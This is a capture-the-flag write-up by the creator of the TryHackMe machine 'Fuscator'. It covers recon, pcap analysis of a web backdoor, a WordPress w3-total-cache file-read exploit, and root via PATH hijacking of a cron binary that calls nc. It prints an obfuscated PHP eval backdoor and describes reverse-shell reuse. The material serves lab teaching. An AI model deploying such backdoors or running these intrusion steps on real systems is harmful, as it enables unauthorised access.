---
title: "[THM] Fuscator"
excerpt_separator: <!--more-->
categories:
  - CTF
tags:
  - THM
  - MCC
  - "2022"
toc: true
toc_sticky: true
toc_label: "Table of Contents"
---

Fuscator is a medium dificulty boot2root machine I created for Malaysia Cyber Security Camp (MCC) 2022 as an assignment using TryHackMe. You can access it [here](https://tryhackme.com/jr/fuscator)

Since boot2root usually is more on red team side and MCC participants have different type of skillset, hence I decided to create a machine that required both blue and red team skillset to solve it.

There are **two** ways to get user foothold and **one** way to get root as far as I know. Please hit [me](https://twitter.com/tzion0) up on twitter if you found unintended solution, I'll be very happy to hear about it :D

<!--more-->

# User Foothold

As usual, we start with scanning the machine using nmap:
```
nmap -sC -sV <IP>
```
##  Result
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1000     1000      1373470 Nov 02 08:15 log.pcap
|_-rw-r--r--    1 1000     1000          117 Nov 14 11:37 notes.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.3.202
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d52ce74f975ae2f2099328db18d4a713 (RSA)
|   256 00452c0ea48ea25829af8875e43ad878 (ECDSA)
|_  256 6fbdfd6d06da8552b621feffbbd6fb87 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fuscator
|_http-generator: WordPress 6.1
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

From the result we can see 3 ports are open and port 21 (FTP) allows anonymous login, lets connect it anonymously using ftp:
```
ftp -i 10.10.139.146
```
After login with anonymous:<ANY>, we can download all the files in it:

![IMG](/assets/images/thm-fuscator/1.png)

Viewing the `notes.txt` we can see the packet capture (log.pcap) is related to a security incident.
```
Dear tato,

This directory contains the packet capture you requested for recent security incident.

Regards,
Fuscato
```

Let's investigate the pcap file using Wireshark. In wireshark, we can follow the TCP stream to investigate:
```
Right click on any TCP packet -> Follow -> TCP Stream
```
After that, we can start increase the Stream and see anything stands out:

![IMG](/assets/images/thm-fuscator/2.png)

On stream 14, we can see something suspicious:

![IMG](/assets/images/thm-fuscator/3.png)

The parameter `pct` is having a base64 encoded value, decode it we can see it was a reverse shell payload:

![IMG](/assets/images/thm-fuscator/4.png)

At this point, we should try to reuse this backdoor to obtain a shell. Note that you have to include the word `agentX` in User-Agent of your request to execute commands successfully, this is why I gave the hint:
```
Being attentive might skip some steps to gain user foothold
```
![IMG](/assets/images/thm-fuscator/5.png)

I notice most of the participants didn't notice it but they copy the suspicious request and paste it directly into Burp Suite's repeater which will do the job as well.

You can create your reverse shell payload using this [site](https://www.revshells.com/), encode it using base64 and listen to the port you chose and will get a www-data shell:

![IMG](/assets/images/thm-fuscator/6.png)

Now, what if your blue team groupmates didn't notice the `agentX` in User-Agent and can't get a shell by mimic the suspicious request from your browser? This is where the red team groupmates come to rescue by exploiting a plugin in the wordpress site on port 80.

Before we continue, remember to add this line to your `/etc/hosts` if you have rendering issue of the wordpress site:
```
<MACHINE IP> fuscator.mcc
```
We can get `fuscator.mcc` by browsing around the site, some links in the site point to this domain.

Now, browsing the site, you should have notice this:

![IMG](/assets/images/thm-fuscator/7.png)

From the warning error we will obtain the web root path of the site and the plugin yielding the warning error.

At this point, we can start enumerate the wordpress site using `wpscan`:
```
wpscan --url fuscator.mcc -e p --plugins-detection mixed
```
## Result
```
[+] URL: http://fuscator.mcc/ [10.10.139.146]
[+] Started: Mon Dec  5 05:00:28 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://fuscator.mcc/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://fuscator.mcc/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://fuscator.mcc/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://fuscator.mcc/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.1 identified (Outdated, released on 2022-11-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://fuscator.mcc/feed/, <generator>https://wordpress.org/?v=6.1</generator>
 |  - http://fuscator.mcc/comments/feed/, <generator>https://wordpress.org/?v=6.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://fuscator.mcc/wp-content/themes/twentytwenty/
 | Latest Version: 2.1 (up to date)
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://fuscator.mcc/wp-content/themes/twentytwenty/readme.txt
 | Style URL: http://fuscator.mcc/wp-content/themes/twentytwenty/style.css?ver=2.1
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://fuscator.mcc/wp-content/themes/twentytwenty/style.css?ver=2.1, Match: 'Version: 2.1'

[+] Enumerating Most Popular Plugins (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:04:29 <================================== > (1476 / 1500) 98.40%  ETA: 00:00:04
 Checking Known Locations - Time: 00:04:31 <==================================> (1500 / 1500) 100.00% Time: 00:04:31
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://fuscator.mcc/wp-content/plugins/akismet/
 | Latest Version: 5.0.2
 | Last Updated: 2022-12-01T17:18:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://fuscator.mcc/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.

[+] health-check
 | Location: http://fuscator.mcc/wp-content/plugins/health-check/
 | Last Updated: 2022-11-01T23:08:00.000Z
 | Readme: http://fuscator.mcc/wp-content/plugins/health-check/readme.txt
 | [!] The version is out of date, the latest version is 1.5.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://fuscator.mcc/wp-content/plugins/health-check/, status: 403
 |
 | Version: 1.4.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://fuscator.mcc/wp-content/plugins/health-check/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://fuscator.mcc/wp-content/plugins/health-check/readme.txt

[+] w3-total-cache
 | Location: http://fuscator.mcc/wp-content/plugins/w3-total-cache/
 | Last Updated: 2022-10-31T20:03:00.000Z
 | Readme: http://fuscator.mcc/wp-content/plugins/w3-total-cache/readme.txt
 | [!] The version is out of date, the latest version is 2.2.7
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://fuscator.mcc/wp-content/plugins/w3-total-cache/, status: 403
 |
 | Version: 0.9.2.10 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://fuscator.mcc/wp-content/plugins/w3-total-cache/readme.txt
```

From the result we can see multiple outdated plugins, but the main focus is w3-total-cache, which is vulnerable to Unauthenticated Arbitrary File Read, we can get the exploit module through [exploitdb](https://www.exploit-db.com/exploits/49317)

The exploit module is written in Ruby language, I'll leave it as a small exercise for readers to import it into their msfconsole.

Once the exploit module is imported, we can set the required options and execute it:

![IMG](/assets/images/thm-fuscator/8.png)

![IMG](/assets/images/thm-fuscator/9.png)

From now on, since we have the root path of wordpress site, we have two options:
1. Read the `wp-config.php` to obtain credential and try SSH into users obtained from `/etc/passwd`.
2. Read the backdoor `utils-bd.php` to learn more about it.

The first option will succeed by SSH login as fuscato user with the password obtained from `wp-config.php`.

We will be digging into second option. Setting the FILEPATH of the exploit to `/srv/www/wordpress/utils-bd.php`, we will obtain its source code:

![IMG](/assets/images/thm-fuscator/10.png)

The source code is obfuscated:
```php
<?php function flkxkz($jhVI)
{
$jhVI=gzinflate(base64_decode($jhVI));
 for($i=0;$i<strlen($jhVI);$i++)
 {
$jhVI[$i] = chr(ord($jhVI[$i])-1);
 }
 return $jhVI;
 }eval(flkxkz("U1QEAu6sdEVNpbS8wtIqTUXVhGC3oDC3kNAYjcKUUo04RS1FdXXFrJKStFJN1YQQt+Bwt+AYDc/Q0MCEMCAvwcnDzT9UI05LS7GGWxEKstI1S0qLCwtK8OnQVdRIykjLL43U0FJUsrNTTE/KLUnTQhjCVVJVUpqWp5mcVJJmbpqQmpZSkJqmie48LS0buI467jpuB3sA"));?>
```

You can choose to deobfuscate it manually, however, by changing the `eval()` to `echo()`, we will get the clean deobfuscated source code:

![IMG](/assets/images/thm-fuscator/11.png)

From the source code, we will know that `agentX` is required to execute commands successfully, thus getting a www-data shell.

After getting the www-data shell, we can obtain a password located in `wp-config.php`, which can be use to login as fuscato by reusing the password:

![IMG](/assets/images/thm-fuscator/12.png)

The user flag is located in `/home/fucsato/user.txt`.

# Privilege Escalation
The privilege escalation point actually lies at `/etc/crontab`, however when you view it using `cat`, you won't see any suspicious cronjob:

![IMG](/assets/images/thm-fuscator/13.png)

To view the suspicious cronjob, you have use text editor like nano (~~I love vim~~):

![IMG](/assets/images/thm-fuscator/14.png)

The objective of hiding the cronjob is to match the storyline of this machine, and the inspiration is obtained from [here](https://cybergladius.com/redteam-tip-hiding-cronjobs/)

From the cronjob we know that a suspicious binary is executing as root every minute, so let's start analyzing it.

This binary is actually obfuscated using [movfuscator](https://github.com/xoreaxeaxeax/movfuscator) and you can deobfuscate it using [demovfuscator](https://github.com/kirschju/demovfuscator). However, deobfuscate the binary won't recover much but atleast you learn more about the behavior of the binary. Moreover, since this is a medium machine, reversing/deobfuscating/decrypting is not required but readers who are interested can attempt to deobfuscate it.

Moving on, the hint given `Root - Don't trace my path!` actually indicating `ltrace` and `path injection`. Hence we can attempt to ltrace the binary:
```
ltrace ./66-motd-update
```
![IMG](/assets/images/thm-fuscator/15.png)

Note that the string is not fully outputted, we can increase it using `-s 500`:
```
ltrace -s 500 ./66-motd-update
```
![IMG](/assets/images/thm-fuscator/16.png)

From the above picture we can see it attempt to execute a reverse shell. However, the `nc` and `timeout` specified is not using absolute path, making them vulnerable to Path Hijacking.

### Path Hijacking
Linux will actually search through every directory located in **$PATH** environment variable when there is an execution of binary without absolute path. For example:

![IMG](/assets/images/thm-fuscator/17.png)

From the picture above we can see `nc` binary is located at `/bin/nc`, when we execute `nc` binary by simply typing `nc`, Linux will search through all the directories in **$PATH** environment variable from left to right until it found a binary called `nc`, which means it will start finding `nc` binary from:
```
/usr/local/sbin -> /usr/local/bin -> /usr/sbin -> /usr/bin -> /sbin -> /bin -> /usr/games -> /usr/local/games -> /snap/bin
```

Since `nc` is located in `/bin/nc`, if we place a binary with the same name as `nc` in preceding directories of `/bin`, Linux will execute it instead of the actual `/bin/nc`.

Looking at `/usr/local/sbin` and `/usr/local/bin`, we have the privilege to write into it as we are belong to staff group:

![IMG](/assets/images/thm-fuscator/18.png)

Hence, write a reverse shell into `/usr/local/sbin/nc`, finger cross, and eventually we will get a shell:

![IMG](/assets/images/thm-fuscator/19.png)

That's it, the root flag is located in `/root/root.txt`.

Thank you for reading till the end and hopefully you learned something new <3